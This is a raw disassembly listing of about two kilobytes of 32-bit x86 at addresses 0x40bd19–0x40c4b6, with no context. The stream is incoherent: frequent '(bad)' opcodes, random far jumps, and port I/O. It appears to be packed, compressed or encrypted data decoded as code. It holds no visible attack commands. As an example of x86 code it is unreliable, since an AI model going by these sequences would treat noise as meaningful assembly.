  40bd19:	xlat   BYTE PTR ds:[ebx]
  40bd1a:	loopne 0x40bd33
  40bd1c:	in     al,dx
  40bd1d:	cdq    
  40bd1e:	jg     0x40bca3
  40bd20:	ss in  eax,dx
  40bd22:	sbb    al,0xe
  40bd24:	pop    esp
  40bd25:	xor    dh,bl
  40bd27:	retf   0xcf2f
  40bd2a:	lahf   
  40bd2b:	test   BYTE PTR [edx+0x68],dl
  40bd2e:	sbb    DWORD PTR [ecx-0x3f],ebx
  40bd31:	ror    DWORD PTR [ebp-0x7d],0xf
  40bd35:	ffreep st(2)
  40bd37:	push   esi
  40bd38:	call   0x116b:0xc93b94c2
  40bd3f:	and    ebp,edi
  40bd41:	pop    esp
  40bd42:	lods   al,BYTE PTR ds:[esi]
  40bd43:	ds pop ebp
  40bd45:	mov    BYTE PTR [edi+0x3221a6c7],0x68
  40bd4c:	mov    ecx,0xb3c890a1
  40bd51:	test   eax,eax
  40bd53:	test   eax,0x865cf4e8
  40bd58:	push   edx
  40bd59:	xor    ebx,esp
  40bd5b:	push   ebx
  40bd5c:	ins    BYTE PTR es:[edi],dx
  40bd5d:	leave  
  40bd5e:	mov    ecx,0x5ca5af67
  40bd63:	push   edx
  40bd64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd65:	inc    esi
  40bd66:	scas   eax,DWORD PTR es:[edi]
  40bd67:	xchg   ebx,eax
  40bd68:	sbb    al,0x16
  40bd6a:	(bad)  
  40bd6b:	push   esp
  40bd6c:	mov    ds:0x182702e4,eax
  40bd71:	cmp    al,0x6b
  40bd73:	mov    DWORD PTR [edi],esp
  40bd75:	adc    ebp,ebp
  40bd77:	add    DWORD PTR [ecx+eiz*1-0x55fa38d5],edx
  40bd7e:	int3   
  40bd7f:	mul    BYTE PTR [eax+edi*4+0xc]
  40bd83:	mov    WORD PTR [ebx],?
  40bd85:	adc    eax,eax
  40bd87:	pop    ecx
  40bd88:	adc    BYTE PTR [edx],bl
  40bd8a:	sbb    edx,0x38a27dd3
  40bd90:	push   0xaa91e352
  40bd95:	shr    edi,cl
  40bd97:	fmul   QWORD PTR [ebp+eiz*4+0x64]
  40bd9b:	ret    0x159e
  40bd9e:	xchg   esp,eax
  40bd9f:	pcmpeqw mm3,QWORD PTR [edx+0x6e]
  40bda3:	cmp    ecx,eax
  40bda5:	inc    edi
  40bda6:	mov    ebp,0x53da8102
  40bdab:	sub    ch,BYTE PTR [ebp+0x5a]
  40bdae:	out    dx,al
  40bdaf:	adc    al,0xdb
  40bdb1:	pop    ds
  40bdb2:	xor    dl,al
  40bdb4:	xor    al,dh
  40bdb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb7:	cmp    dh,BYTE PTR [edx*8-0x273c1a95]
  40bdbe:	adc    DWORD PTR [eax+0x6f],edi
  40bdc1:	dec    edx
  40bdc2:	in     al,dx
  40bdc3:	fcom   DWORD PTR [edi]
  40bdc5:	pop    ds
  40bdc6:	mov    cl,BYTE PTR [esi+0x6e6a2b34]
  40bdcc:	adc    al,0x6d
  40bdce:	mov    al,ds:0x9cac1bf0
  40bdd3:	int3   
  40bdd4:	mov    ecx,0xf45d169d
  40bdd9:	shr    DWORD PTR [eax+eiz*8+0x2d],0x8f
  40bdde:	mov    esp,DWORD PTR [ebp+eiz*2-0x1dd5edc3]
  40bde5:	ss inc eax
  40bde7:	jnp    0x40bd95
  40bde9:	sub    al,0xed
  40bdeb:	(bad)  
  40bdec:	fcmovb st,st(0)
  40bdee:	(bad)  
  40bdef:	mov    ecx,0xb098c687
  40bdf4:	fld    QWORD PTR [edi+edx*1]
  40bdf7:	out    dx,eax
  40bdf8:	jbe    0x40be04
  40bdfa:	mov    bh,0xbe
  40bdfc:	cmp    al,0x69
  40bdfe:	and    edx,DWORD PTR [ecx]
  40be00:	inc    ebp
  40be01:	in     al,dx
  40be02:	xlat   BYTE PTR ds:[ebx]
  40be03:	stos   DWORD PTR es:[edi],eax
  40be04:	cld    
  40be05:	jne    0x40bda3
  40be07:	ds pop ds
  40be09:	xor    DWORD PTR [edi-0x192e96e1],eax
  40be0f:	push   es
  40be10:	pusha  
  40be11:	rcl    bl,cl
  40be13:	test   DWORD PTR [ebx],ecx
  40be15:	jecxz  0x40bdcd
  40be17:	int    0x78
  40be19:	push   esp
  40be1a:	push   ecx
  40be1b:	pop    esp
  40be1c:	push   ebx
  40be1d:	mov    edi,0xfe193e61
  40be22:	imul   edi,DWORD PTR [edi],0x35a732bc
  40be28:	(bad)  
  40be29:	inc    edx
  40be2a:	and    al,0xe5
  40be2c:	call   0x2de78177
  40be31:	and    esp,esi
  40be33:	(bad)  
  40be34:	mov    eax,0x27d76563
  40be39:	xchg   BYTE PTR [esi+0x9],bh
  40be3c:	mov    ds:0x995c6a95,eax
  40be41:	xor    esp,DWORD PTR [edx-0x13]
  40be44:	jbe    0x40bebd
  40be46:	ror    DWORD PTR [ebp+0x12d2c2de],cl
  40be4c:	mov    dl,0xd7
  40be4e:	in     eax,dx
  40be4f:	add    al,0x97
  40be51:	in     al,dx
  40be52:	adc    DWORD PTR [esi],edx
  40be54:	imul   edi,DWORD PTR [edx+0x53ee3b7d],0x64
  40be5b:	in     eax,0xb9
  40be5d:	les    ebp,FWORD PTR [ebp+0x1309a33c]
  40be63:	(bad)  
  40be64:	pushf  
  40be65:	push   ss
  40be66:	fimul  WORD PTR [edi]
  40be68:	hlt    
  40be69:	fisubr WORD PTR ds:0xbeba43e6
  40be6f:	mov    edi,0x29acf9ae
  40be74:	les    ecx,FWORD PTR [edi-0x34d67426]
  40be7a:	scas   al,BYTE PTR es:[edi]
  40be7b:	test   bl,0x3f
  40be7e:	lock mov ebp,0x31499697
  40be84:	repz inc edx
  40be86:	xchg   edi,eax
  40be87:	adc    DWORD PTR [edx-0x2366e750],ecx
  40be8d:	push   sp
  40be8f:	sbb    BYTE PTR [edx],ch
  40be91:	fistp  QWORD PTR [eax+ebx*2-0x60453c5a]
  40be98:	sub    ch,bl
  40be9a:	daa    
  40be9b:	scas   eax,DWORD PTR es:[edi]
  40be9c:	jnp    0x40bed1
  40be9e:	fcmovnbe st,st(6)
  40bea0:	pushf  
  40bea1:	fiadd  WORD PTR [eax+0xd3acb53]
  40bea7:	dec    edx
  40bea8:	mov    edi,0xd7638ef
  40bead:	gs push edi
  40beaf:	(bad)  
  40beb0:	mov    edi,0x600fef44
  40beb5:	ins    BYTE PTR es:[edi],dx
  40beb6:	pop    edi
  40beb7:	imul   ecx,DWORD PTR [ecx+0x61],0xffffff8f
  40bebb:	mov    cl,0x16
  40bebd:	aas    
  40bebe:	push   edi
  40bebf:	icebp  
  40bec0:	sbb    BYTE PTR [ecx+esi*4-0x75041ae9],0x66
  40bec8:	and    eax,0x408b8db5
  40becd:	ds push ebx
  40becf:	adc    BYTE PTR [esi],dl
  40bed1:	loopne 0x40beb3
  40bed3:	mov    edi,0xa335e48d
  40bed8:	dec    ebp
  40bed9:	push   edi
  40beda:	jle    0x40bf3f
  40bedc:	jl     0x40bec7
  40bede:	jmp    0x27d43f54
  40bee3:	xchg   ebp,eax
  40bee4:	int    0x7
  40bee6:	xchg   BYTE PTR [ebp+0x6bbabc21],dh
  40beec:	(bad)  
  40beed:	mov    ds:0xc56c4faa,al
  40bef2:	mov    esp,0xba7df796
  40bef7:	scas   al,BYTE PTR es:[edi]
  40bef8:	stc    
  40bef9:	jae    0x40bf32
  40befb:	icebp  
  40befc:	dec    esp
  40befd:	ret    0xcbd3
  40bf00:	pop    es
  40bf01:	cld    
  40bf02:	inc    eax
  40bf03:	xchg   bh,dl
  40bf05:	das    
  40bf06:	add    al,0xbf
  40bf08:	fcomip st,st(5)
  40bf0a:	jg     0x40bf2f
  40bf0c:	pusha  
  40bf0d:	ja     0x40bf4b
  40bf0f:	fadd   DWORD PTR [edx-0x6e]
  40bf12:	sbb    DWORD PTR [edi-0x5bfbfe4f],esp
  40bf18:	into   
  40bf19:	sub    edx,ebx
  40bf1b:	sub    DWORD PTR [eax+0x5b],0xfffffff3
  40bf1f:	jge    0x40bec9
  40bf21:	dec    edi
  40bf22:	inc    ecx
  40bf23:	cmp    al,0xbd
  40bf25:	lahf   
  40bf26:	iret   
  40bf27:	jmp    0xa58c9bb1
  40bf2c:	mov    dl,0xb9
  40bf2e:	pop    edi
  40bf2f:	adc    dl,BYTE PTR [esi+0x5fcf3041]
  40bf35:	adc    al,BYTE PTR [eax+0x1d]
  40bf38:	in     eax,dx
  40bf39:	adc    edx,DWORD PTR [ebx]
  40bf3b:	push   esi
  40bf3c:	add    BYTE PTR [eax+0x433464a1],bh
  40bf42:	idiv   BYTE PTR [ebp-0x47]
  40bf45:	data16 cmc 
  40bf47:	sub    al,0x2f
  40bf49:	sub    al,0x4d
  40bf4b:	sbb    BYTE PTR es:[esi+0x44a9bad4],ch
  40bf52:	fs ret 0xf162
  40bf56:	jle    0x40bf35
  40bf58:	pop    es
  40bf59:	mov    bl,0xe1
  40bf5b:	cmp    BYTE PTR [esi+ebp*1],al
  40bf5e:	or     ecx,DWORD PTR [ebp+ebp*4-0x3]
  40bf62:	cmp    BYTE PTR [ebx],0x48
  40bf65:	push   esi
  40bf66:	pop    ebx
  40bf67:	stos   DWORD PTR es:[edi],eax
  40bf68:	pushf  
  40bf69:	nop
  40bf6a:	pop    ss
  40bf6b:	push   0x5a
  40bf6d:	(bad)  
  40bf6e:	stos   DWORD PTR es:[edi],eax
  40bf6f:	(bad)  
  40bf71:	scas   al,BYTE PTR es:[edi]
  40bf72:	sbb    ebx,ecx
  40bf74:	sqrtps xmm7,xmm1
  40bf77:	mov    dl,0xff
  40bf79:	popf   
  40bf7a:	xor    ebx,DWORD PTR [ebx]
  40bf7c:	sahf   
  40bf7d:	stos   DWORD PTR es:[edi],eax
  40bf7e:	push   0x952d5686
  40bf83:	out    0xb0,eax
  40bf85:	in     al,0x67
  40bf87:	das    
  40bf88:	pop    ds
  40bf89:	popf   
  40bf8a:	nop
  40bf8b:	nop
  40bf8c:	sub    bh,0xbc
  40bf8f:	call   0x91f483b4
  40bf94:	add    al,0x4e
  40bf96:	call   0xd041b0d6
  40bf9b:	das    
  40bf9c:	into   
  40bf9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf9e:	mov    edx,0x8295f421
  40bfa3:	jb     0x40bf9d
  40bfa5:	cdq    
  40bfa6:	mov    bl,0x78
  40bfa8:	jl     0x40bf46
  40bfaa:	(bad)  
  40bfab:	dec    edx
  40bfac:	sub    BYTE PTR [ecx+0x17],dh
  40bfaf:	jecxz  0x40bf76
  40bfb1:	adc    eax,0x722688b8
  40bfb6:	nop
  40bfb7:	or     al,0x42
  40bfb9:	mov    eax,0xddc74602
  40bfbe:	in     eax,0x1d
  40bfc0:	lock mov ch,0xc2
  40bfc3:	mov    ah,0xc1
  40bfc5:	mov    ah,0x2
  40bfc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc8:	push   ebx
  40bfc9:	mov    al,ds:0xaa844d0c
  40bfce:	or     BYTE PTR [ecx],0xaa
  40bfd1:	repnz icebp 
  40bfd3:	fild   WORD PTR [esi+0x4d]
  40bfd6:	sahf   
  40bfd7:	add    dh,BYTE PTR [esi+edx*2+0x52]
  40bfdb:	and    BYTE PTR [ebx],0x7b
  40bfde:	js     0x40bfc4
  40bfe0:	sbb    eax,0xbdd36455
  40bfe5:	xchg   esi,eax
  40bfe6:	cmp    BYTE PTR [ebp+0x56432cdc],al
  40bfec:	or     eax,0x4ec447e2
  40bff1:	je     0x40c035
  40bff3:	inc    esi
  40bff4:	int    0x41
  40bff6:	jb     0x40c060
  40bff8:	(bad)  
  40bff9:	push   ebp
  40bffa:	push   ebx
  40bffb:	std    
  40bffc:	adc    BYTE PTR [edi+0x4c],al
  40bfff:	test   DWORD PTR [eax+ecx*4-0x44],0xa4936463
  40c007:	pop    esp
  40c008:	fdivr  DWORD PTR [eax]
  40c00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c00b:	jmp    0x663653f4
  40c010:	or     eax,0x1376c179
  40c015:	fs push ecx
  40c017:	test   al,0x6f
  40c019:	mov    ebx,0xf78de74
  40c01e:	add    eax,edi
  40c020:	push   esi
  40c021:	mov    bl,0xce
  40c023:	sub    esp,DWORD PTR [ebp+0x2f]
  40c026:	(bad)  [esi+0x32]
  40c029:	(bad)  
  40c02a:	jmp    0x1dfaac3c
  40c02f:	in     eax,dx
  40c030:	cmp    esi,ebp
  40c032:	mov    dh,0xcc
  40c034:	ret    0xa1cf
  40c037:	mov    cs,edx
  40c039:	jmp    0x3acb:0xc8ed45c
  40c040:	loopne 0x40bfdc
  40c042:	dec    ecx
  40c043:	mov    cs,ebp
  40c045:	xor    dh,0xf1
  40c048:	inc    ebp
  40c049:	mov    al,ds:0x95bc4ec2
  40c04e:	hlt    
  40c04f:	enter  0x9dbe,0xf2
  40c053:	(bad)  
  40c055:	cmc    
  40c056:	leave  
  40c057:	mov    edi,0x12166727
  40c05c:	xlat   BYTE PTR ds:[ebx]
  40c05d:	cli    
  40c05e:	inc    esi
  40c05f:	sub    ebx,DWORD PTR [ebx+0x345358cd]
  40c065:	or     BYTE PTR [ebp-0x69bf412d],0xc9
  40c06c:	and    DWORD PTR [ebp+0x40e80dd0],esi
  40c072:	ins    WORD PTR es:[edi],dx
  40c074:	mov    dh,0xbb
  40c076:	sub    BYTE PTR [edi-0x53],0x1f
  40c07a:	int3   
  40c07b:	cmp    ch,0xc9
  40c07e:	in     eax,0x1d
  40c080:	jmp    0x775a42d6
  40c085:	and    DWORD PTR [edi-0x6a],esi
  40c088:	pushf  
  40c089:	lock cwde 
  40c08b:	xor    BYTE PTR [edx-0x20],al
  40c08e:	retf   
  40c08f:	mov    esp,0xc61d2283
  40c094:	cmp    bl,ch
  40c096:	jne    0x40c058
  40c098:	mov    al,0x58
  40c09a:	sbb    ebx,esi
  40c09c:	(bad)  
  40c09d:	sub    esi,DWORD PTR [ebx+0x35]
  40c0a0:	mov    ds:0xb750df51,al
  40c0a5:	pop    edi
  40c0a6:	mov    esp,0xb4cd898e
  40c0ab:	call   0x3a9e:0xf5e77f90
  40c0b2:	clc    
  40c0b3:	push   ebp
  40c0b4:	leave  
  40c0b5:	xchg   al,al
  40c0b7:	scas   eax,DWORD PTR es:[edi]
  40c0b8:	push   es
  40c0b9:	jns    0x40c0c2
  40c0bb:	xor    BYTE PTR [edi-0x219292a0],cl
  40c0c1:	and    al,0x33
  40c0c3:	test   al,0x20
  40c0c5:	ss mov eax,0x2cf382ae
  40c0cb:	ss push esi
  40c0cd:	sub    eax,0x8cb3542f
  40c0d2:	(bad)  
  40c0d3:	mov    edi,0x4f53c8d9
  40c0d8:	dec    esp
  40c0d9:	sbb    eax,0xadd25022
  40c0de:	mov    eax,ds:0x3ec45090
  40c0e3:	mov    esi,0x3265f53d
  40c0e8:	or     bh,BYTE PTR [edx+0x52a12091]
  40c0ee:	out    0xeb,eax
  40c0f0:	cld    
  40c0f1:	xor    al,0x7
  40c0f4:	daa    
  40c0f5:	xlat   BYTE PTR ds:[ebx]
  40c0f6:	dec    ebp
  40c0f7:	mov    ebx,DWORD PTR [eax-0x55]
  40c0fa:	inc    eax
  40c0fb:	icebp  
  40c0fc:	adc    al,0x4
  40c0fe:	jo     0x40c093
  40c100:	xor    bl,bl
  40c102:	ret    
  40c103:	into   
  40c104:	push   esp
  40c105:	(bad)  
  40c106:	dec    eax
  40c107:	mov    WORD PTR [esi+0x7db153f9],cs
  40c10d:	xchg   ecx,eax
  40c10e:	adc    eax,0xd9665966
  40c113:	call   0x98f1ffe7
  40c118:	sbb    eax,0x189b35de
  40c11d:	jmp    0x71b030e1
  40c122:	inc    eax
  40c123:	mov    DWORD PTR [edi],0x163be11c
  40c129:	mov    ecx,0xb679b8ca
  40c12e:	xchg   DWORD PTR ds:0xd80def00,esp
  40c134:	pop    esi
  40c135:	dec    edx
  40c136:	hlt    
  40c137:	cmp    ah,cl
  40c139:	and    bh,BYTE PTR [esi+0x24]
  40c13c:	and    al,0x95
  40c13e:	adc    ch,BYTE PTR [edi+0x70]
  40c141:	mov    eax,0x422d1135
  40c146:	jp     0x40c17f
  40c148:	jmp    0x5baa:0x6f1c3392
  40c14f:	pop    ecx
  40c150:	popa   
  40c151:	int3   
  40c152:	jg     0x40c16b
  40c154:	push   ecx
  40c155:	or     al,BYTE PTR [ebx]
  40c157:	sahf   
  40c158:	inc    ebx
  40c159:	sbb    BYTE PTR [ebx-0x950fd66],0x72
  40c160:	rcl    BYTE PTR [edx+0x57],1
  40c163:	ret    0x7184
  40c166:	and    al,0x2e
  40c168:	repz das 
  40c16a:	add    edx,DWORD PTR [eax-0x3817b428]
  40c170:	jecxz  0x40c115
  40c172:	ret    
  40c173:	hlt    
  40c174:	xchg   esi,eax
  40c175:	mov    BYTE PTR [eax-0x42d8d045],cl
  40c17b:	sbb    eax,0x79e2dd63
  40c180:	jne    0x40c125
  40c182:	sub    DWORD PTR [ecx-0x3e],eax
  40c185:	enter  0xe111,0x59
  40c189:	imul   ebx,DWORD PTR [edi+0x28],0x4f6b92ee
  40c190:	dec    eax
  40c191:	mov    BYTE PTR [eax+0x3ae18417],bh
  40c197:	ss clc 
  40c199:	or     eax,0xe2e4248
  40c19e:	jno    0x40c16b
  40c1a0:	sbb    edi,DWORD PTR [edx+ebx*1]
  40c1a3:	hlt    
  40c1a4:	mov    bl,0xba
  40c1a6:	pop    ebx
  40c1a7:	ret    0xfc70
  40c1aa:	dec    edx
  40c1ab:	xchg   ebx,eax
  40c1ac:	add    edx,DWORD PTR [esi-0x437c6033]
  40c1b2:	out    dx,al
  40c1b3:	aad    0x12
  40c1b5:	adc    BYTE PTR [ebp+0x10617fb5],bl
  40c1bb:	les    ecx,FWORD PTR [ebp+0x70b56f74]
  40c1c1:	aad    0xc2
  40c1c3:	cmp    eax,edx
  40c1c5:	xchg   edx,eax
  40c1c6:	aaa    
  40c1c7:	in     eax,dx
  40c1c8:	call   0x668e40ac
  40c1cd:	push   ebp
  40c1ce:	ins    DWORD PTR es:[edi],dx
  40c1cf:	daa    
  40c1d0:	xchg   edx,eax
  40c1d1:	cld    
  40c1d2:	fldcw  WORD PTR [ecx-0x7b644bcc]
  40c1d8:	in     al,dx
  40c1d9:	push   ss
  40c1da:	call   0xf90a:0x6807b04f
  40c1e1:	fist   DWORD PTR [edx+0x4098cdf2]
  40c1e7:	frstor [ecx-0x77e0d8f4]
  40c1ed:	xor    al,0xba
  40c1f0:	pop    ecx
  40c1f1:	outs   dx,DWORD PTR ds:[esi]
  40c1f2:	cwde   
  40c1f3:	lods   al,BYTE PTR ds:[esi]
  40c1f4:	lahf   
  40c1f5:	mov    ds:0xc637de28,eax
  40c1fa:	jne    0x40c1ce
  40c1fc:	mov    edi,0xfb1990cc
  40c201:	pop    es
  40c202:	cli    
  40c203:	and    edi,edi
  40c205:	mov    bh,0x70
  40c207:	xor    BYTE PTR [ecx+0x59],al
  40c20a:	pop    ds
  40c20b:	jmp    0x40c1e8
  40c20d:	push   esi
  40c20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c20f:	jnp    0x40c24f
  40c211:	and    edi,edx
  40c213:	fchs   
  40c215:	nop
  40c216:	inc    ebp
  40c217:	mov    ch,0xa9
  40c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c21a:	cli    
  40c21b:	or     DWORD PTR [ecx+0x782fc7d1],edi
  40c221:	inc    eax
  40c222:	mov    DWORD PTR [edx],eax
  40c224:	in     al,0xe5
  40c226:	mov    esp,0x6587ceda
  40c22b:	jmp    DWORD PTR [ebp+0x60]
  40c22e:	xor    DWORD PTR [ebx+ecx*8+0x387f61a7],esi
  40c235:	sahf   
  40c236:	fstp   QWORD PTR [eax]
  40c238:	out    dx,al
  40c239:	and    eax,0xc8d5bc1a
  40c23e:	clc    
  40c23f:	sar    BYTE PTR [ebx+eiz*1-0x7f],cl
  40c243:	gs dec esp
  40c245:	xchg   edi,eax
  40c246:	push   cs
  40c247:	imul   ecx,DWORD PTR [esi+0x2e],0xfffffffa
  40c24b:	push   esp
  40c24c:	rol    BYTE PTR [eax+0x59],1
  40c24f:	cld    
  40c250:	push   esi
  40c251:	iret   
  40c252:	fld    DWORD PTR [ecx-0x60]
  40c255:	lahf   
  40c256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c257:	shr    DWORD PTR ss:[eax],1
  40c25a:	jmp    0x763c:0xf98c0acc
  40c261:	test   bh,dl
  40c263:	fidivr WORD PTR [ecx]
  40c265:	sub    eax,0x84eac497
  40c26a:	mov    al,ds:0x2df549b8
  40c26f:	cmp    esp,edx
  40c271:	cli    
  40c272:	push   0x3890392a
  40c277:	pop    es
  40c278:	mov    DWORD PTR [esi+0xc],eax
  40c27b:	jecxz  0x40c2b6
  40c27d:	and    edi,DWORD PTR [ebx-0x73ad2417]
  40c283:	jmp    0x3219:0xb9cc1c7f
  40c28a:	enter  0x63f6,0x57
  40c28e:	xchg   ebx,eax
  40c28f:	sub    edi,DWORD PTR [ebp-0x247f563a]
  40c295:	popf   
  40c296:	dec    ebx
  40c297:	retf   0xca50
  40c29a:	outs   dx,BYTE PTR ds:[esi]
  40c29b:	adc    BYTE PTR [eax-0x6f195237],ah
  40c2a1:	inc    esi
  40c2a2:	scas   al,BYTE PTR es:[edi]
  40c2a3:	xchg   esi,eax
  40c2a4:	adc    edx,DWORD PTR [edi-0x114b3bf5]
  40c2aa:	js     0x40c2ad
  40c2ac:	(bad)  
  40c2ae:	ins    BYTE PTR es:[edi],dx
  40c2af:	ins    BYTE PTR es:[edi],dx
  40c2b0:	cdq    
  40c2b1:	adc    DWORD PTR [ecx],edx
  40c2b3:	add    bl,dh
  40c2b5:	push   esp
  40c2b6:	in     al,0x27
  40c2b8:	push   es
  40c2b9:	popf   
  40c2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2bb:	dec    edx
  40c2bc:	rdtsc  
  40c2be:	dec    edx
  40c2bf:	hlt    
  40c2c0:	imul   edi,DWORD PTR [ebp+eax*1-0x70553dc3],0xf33095
  40c2cb:	fcom   QWORD PTR [ecx+0x6a76b26b]
  40c2d1:	mov    ebx,0xde8f3e13
  40c2d6:	arpl   WORD PTR [ebp+ebx*4-0x4c8695be],di
  40c2dd:	pop    eax
  40c2de:	popa   
  40c2df:	push   cs
  40c2e0:	xchg   edi,eax
  40c2e1:	adc    eax,0x15af5831
  40c2e6:	aad    0xdb
  40c2e8:	loopne 0x40c31a
  40c2ea:	adc    BYTE PTR [esp+0x2f],dh
  40c2ee:	retf   0xc1f
  40c2f1:	test   DWORD PTR [ecx+0x5c],ecx
  40c2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f5:	add    DWORD PTR [eax-0x75],esp
  40c2f8:	mov    DWORD PTR [edi-0x596f28c0],0xc3520152
  40c302:	jle    0x40c2fb
  40c304:	loop   0x40c339
  40c306:	jecxz  0x40c332
  40c308:	cld    
  40c309:	int    0x7b
  40c30b:	mov    gs,bp
  40c30e:	dec    esi
  40c30f:	das    
  40c310:	cmp    eax,DWORD PTR [ebp+0x24f7f5b5]
  40c316:	xor    DWORD PTR [esi],ecx
  40c318:	(bad)  
  40c319:	test   eax,0xdce1646e
  40c31e:	fsubr  st,st(7)
  40c320:	jmp    DWORD PTR ds:0x7b1af769
  40c326:	mov    esp,0xb54010ce
  40c32b:	jnp    0x40c36d
  40c32d:	out    dx,eax
  40c32e:	ror    ecx,cl
  40c330:	ret    0xb0f7
  40c333:	fisubr DWORD PTR [eax-0x3fab4840]
  40c339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c33a:	jg     0x40c3ae
  40c33c:	mov    DWORD PTR ds:[edi-0x6f],ebx
  40c340:	in     al,dx
  40c341:	push   cs
  40c342:	cli    
  40c343:	xchg   edi,eax
  40c344:	xchg   esi,eax
  40c345:	rcl    DWORD PTR [ecx+0x508896e8],0x28
  40c34c:	std    
  40c34d:	ret    
  40c34e:	fmul   DWORD PTR [ebx]
  40c350:	xor    bl,BYTE PTR [ebp+0x32db66bb]
  40c356:	push   cs
  40c357:	xchg   edx,eax
  40c358:	cmp    al,0xa2
  40c35a:	jmp    0x40c3af
  40c35c:	xor    al,0x16
  40c35e:	push   es
  40c35f:	xor    DWORD PTR [esi-0x2fb15712],ebx
  40c365:	fstp   DWORD PTR [edx+0x7d]
  40c368:	dec    eax
  40c369:	push   esi
  40c36a:	pop    esi
  40c36b:	push   edx
  40c36c:	popa   
  40c36d:	cmp    BYTE PTR [ecx+ebp*4-0x7],dl
  40c371:	sbb    al,dh
  40c373:	nop
  40c374:	cmp    al,0x19
  40c376:	fwait
  40c377:	out    dx,al
  40c378:	in     al,0xbf
  40c37a:	inc    edi
  40c37b:	or     DWORD PTR [edi],0xffffffc6
  40c37e:	sbb    DWORD PTR [esi],0xe09f7bfb
  40c384:	out    dx,al
  40c385:	stos   DWORD PTR es:[edi],eax
  40c386:	call   esi
  40c388:	push   ds
  40c389:	cli    
  40c38a:	rcl    BYTE PTR [ebx],cl
  40c38c:	lea    edi,[eax+0x78ea7f85]
  40c392:	or     al,0xae
  40c394:	push   esi
  40c395:	pop    ds
  40c396:	xchg   edx,eax
  40c397:	cmp    al,0xd5
  40c399:	sub    edx,esp
  40c39b:	stos   BYTE PTR es:[edi],al
  40c39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c39d:	sub    DWORD PTR [ebp+0x53e415cd],ecx
  40c3a3:	adc    DWORD PTR [ecx-0x3c3dcf84],0xc7632c67
  40c3ad:	jno    0x40c343
  40c3af:	jecxz  0x40c376
  40c3b1:	add    eax,0xd44535d
  40c3b6:	add    al,0x19
  40c3b8:	mov    ah,0x0
  40c3ba:	and    BYTE PTR [ebp+0x5f],dl
  40c3bd:	test   BYTE PTR [edx-0x21],0xaa
  40c3c1:	add    BYTE PTR [edx+0x54],dl
  40c3c4:	mov    cl,0x5d
  40c3c6:	mov    cs,WORD PTR [eax]
  40c3c8:	jnp    0x40c35e
  40c3ca:	out    0xc2,eax
  40c3cc:	jbe    0x40c388
  40c3ce:	jnp    0x40c3c6
  40c3d0:	xchg   esi,eax
  40c3d1:	push   0x3d
  40c3d3:	ret    
  40c3d4:	lock mov ebp,0x8acbaecc
  40c3da:	addr16 retf 
  40c3dc:	adc    eax,0xac71a9d5
  40c3e1:	push   es
  40c3e2:	xor    dh,ch
  40c3e4:	loop   0x40c39d
  40c3e6:	sahf   
  40c3e7:	jne    0x40c3cb
  40c3e9:	retf   
  40c3ea:	shr    ebp,cl
  40c3ec:	test   BYTE PTR [ecx],0x85
  40c3ef:	push   ds
  40c3f0:	in     eax,0x0
  40c3f2:	repnz imul ebp,DWORD PTR [esi+0x57],0xffffff92
  40c3f7:	inc    esp
  40c3f8:	dec    eax
  40c3f9:	xor    eax,0xc54aae07
  40c3fe:	jge    0x40c3ca
  40c400:	sub    DWORD PTR [edx],0xa895d189
  40c406:	popa   
  40c407:	imul   edx,DWORD PTR [edx+0x4223bb27],0x97c8dcc7
  40c411:	ds out 0xe1,al
  40c414:	(bad)  
  40c415:	ror    BYTE PTR [edx+0x7a072e2b],cl
  40c41b:	cmp    al,0x6f
  40c41d:	bound  edi,QWORD PTR [edi+0x387897f8]
  40c423:	or     DWORD PTR [ebx+0x51],esp
  40c426:	ss cs mov ecx,0x52a374bd
  40c42d:	inc    esp
  40c42e:	mov    edx,0xd284883a
  40c433:	jne    0x40c406
  40c435:	and    BYTE PTR [eax+0x5f],dh
  40c438:	test   eax,0x8767c63c
  40c43e:	sub    esi,edx
  40c440:	mov    ah,0xdb
  40c442:	sub    dl,dh
  40c444:	imul   edi
  40c446:	js     0x40c474
  40c448:	push   eax
  40c449:	mov    edi,0x420e8b8d
  40c44e:	ficom  DWORD PTR [esi-0x68ecf2f1]
  40c454:	in     eax,dx
  40c455:	clc    
  40c456:	and    BYTE PTR [edx+0x4fd66e4e],dl
  40c45c:	push   esp
  40c45d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c45e:	jns    0x40c48d
  40c460:	scas   eax,DWORD PTR es:[edi]
  40c461:	mov    bh,0x95
  40c463:	xchg   esi,eax
  40c464:	rol    BYTE PTR [edx+0x5a],1
  40c467:	sahf   
  40c468:	sbb    dl,ch
  40c46a:	test   DWORD PTR [ecx],ecx
  40c46c:	arpl   WORD PTR [ebx+0x3643a36d],si
  40c472:	inc    ecx
  40c473:	sbb    al,0x2b
  40c475:	imul   BYTE PTR [edx]
  40c477:	ins    DWORD PTR es:[edi],dx
  40c478:	adc    dh,BYTE PTR [ebx]
  40c47a:	jp     0x40c4ed
  40c47c:	ins    BYTE PTR es:[edi],dx
  40c47d:	push   ds
  40c47e:	and    BYTE PTR [edx+0xc8be455],ah
  40c484:	scas   al,BYTE PTR es:[edi]
  40c485:	scas   eax,DWORD PTR es:[edi]
  40c486:	add    eax,0xbce389f1
  40c48b:	xor    dl,BYTE PTR [edx+0x8b8c4f7]
  40c491:	and    esi,DWORD PTR [eax-0x61]
  40c494:	retf   0xa3a3
  40c497:	pop    eax
  40c498:	and    DWORD PTR [eax+0x4e],edi
  40c49b:	in     al,dx
  40c49c:	repnz mov edi,0xb5b223be
  40c4a2:	mov    ebp,0xd9229a6c
  40c4a7:	stos   DWORD PTR es:[edi],eax
  40c4a8:	jg     0x40c523
  40c4aa:	retf   
  40c4ab:	and    eax,0xcb34708b
  40c4b0:	dec    edx
  40c4b1:	or     al,BYTE PTR [ecx+0x4f]
  40c4b4:	jge    0x40c47e
  40c4b6:	push   ss
